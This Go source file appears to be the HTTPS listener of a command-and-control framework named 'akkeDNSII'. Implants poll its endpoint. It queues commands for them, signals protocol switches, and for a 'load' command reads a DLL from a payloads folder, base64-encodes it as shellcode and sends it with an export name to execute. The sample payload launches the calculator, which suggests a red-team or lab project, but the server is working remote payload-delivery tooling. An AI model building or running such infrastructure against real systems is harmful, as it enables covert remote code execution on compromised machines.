package https

import (
	"akkeDNSII/internals/config"
	"akkeDNSII/internals/control"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/go-chi/chi/v5"
	"log"
	"math/rand"
	"net/http"
	"os"
	"time"
)

// HTTPSServer implements the Server interface for HTTPS
type HTTPSServer struct {
	addr    string
	server  *http.Server
	tlsCert string
	tlsKey  string
}

// HTTPSResponse represents the JSON response for HTTPS
type HTTPSResponse struct {
	Change  bool            `json:"change"`
	Job     bool            `json:"job"`     // is there a job (T) or not (F)
	Command string          `json:"command"` // what is the actual command (for ex load)
	Data    json.RawMessage `json:"data,omitempty"`
	JobID   string          `json:"id,omitempty"`
}

// LoadArgs defines arguments for the "load" command.
type LoadArgs struct {
	ShellcodeBase64 string `json:"shellcode_base64"` // Base64 encoded shellcode (DLL)
	ExportName      string `json:"export_name"`      // Name of the function to call in the DLL (e.g., "LaunchCalc", "RunMe")
}

// NewHTTPSServer creates a new HTTPS server
func NewHTTPSServer(cfg *config.Config) *HTTPSServer {
	return &HTTPSServer{
		addr:    cfg.ServerAddr,
		tlsCert: cfg.TlsCert,
		tlsKey:  cfg.TlsKey,
	}
}

// Start implements Server.Start for HTTPS
func (s *HTTPSServer) Start() error {
	// Create Chi router
	r := chi.NewRouter()

	// Define our GET endpoint
	r.Get("/", RootHandler)

	// Create the HTTP server
	s.server = &http.Server{
		Addr:    s.addr,
		Handler: r,
	}

	// Start the server
	return s.server.ListenAndServeTLS(s.tlsCert, s.tlsKey)
}

func RootHandler(w http.ResponseWriter, r *http.Request) {

	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

	// Check if we should transition
	shouldChange := control.Manager.CheckAndReset()
	response := HTTPSResponse{
		Change: shouldChange,
	}
	if shouldChange {
		log.Printf("HTTPS: Sending transition signal (change=true)")
	} else {
		log.Printf("HTTPS: Normal response (change=false)")
	}

	// Now, check if there is a pending command
	cmd, exists := control.AgentCommands.GetCommand()

	if exists {
		log.Printf("The following command is being sent to agent: %s\n", cmd)
		response.Job = true
		response.Command = cmd

		// Add command-specific arguments
		cmdData, err := addCmdSpecificArgs(cmd)
		if err != nil {
			log.Printf("Error preparing command data: %v", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		response.Data = cmdData

		response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))

		log.Printf("Job prepared, ID: %s\n", response.JobID)

	} else {
		log.Printf("There is no command to send to agent")
	}

	// Encode and send the response
	if err := json.NewEncoder(w).Encode(response); err != nil {
		log.Printf("Error encoding response: %v\n", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

}

// Stop implements Server.Stop for HTTPS
func (s *HTTPSServer) Stop() error {
	// If there's no server, nothing to stop
	if s.server == nil {
		return nil
	}

	// Give the server 5 seconds to shut down gracefully
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	return s.server.Shutdown(ctx)
}

func addCmdSpecificArgs(cmd string) (json.RawMessage, error) {
	switch cmd {
	case "load":
		return addLoadArgs()
	default:
		return nil, fmt.Errorf("unknown command: %s", cmd)
	}
}

func addLoadArgs() (json.RawMessage, error) {
	// Read the DLL file
	dllBytes, err := os.ReadFile("./payloads/calc.dll")
	if err != nil {
		return nil, fmt.Errorf("failed to read DLL file: %w", err)
	}

	shellcodeB64 := base64.StdEncoding.EncodeToString(dllBytes)

	args := LoadArgs{
		ShellcodeBase64: shellcodeB64,
		ExportName:      "LaunchCalc",
	}

	// Marshal the struct to JSON
	jsonData, err := json.Marshal(args)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal LoadArgs: %w", err)
	}

	// Log what we're about to send
	log.Printf("Prepared LoadArgs - ExportName: %s, Shellcode length: %d bytes",
		args.ExportName,
		len(args.ShellcodeBase64))

	// Convert to json.RawMessage
	return jsonData, nil

}
